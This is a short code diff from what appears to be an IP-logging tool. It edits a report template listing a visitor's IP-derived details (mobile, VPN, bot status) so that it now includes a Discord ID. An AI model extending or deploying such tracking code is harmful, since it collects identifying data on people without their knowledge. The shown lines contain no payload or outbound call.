@@ -162,7 +162,8 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
 > **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-> **Discord ID:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['proxy'] else 'False'}`"
+> **Discord ID:** `{discord_id if discord_id else 'Unknown'}`
+
 
 
 
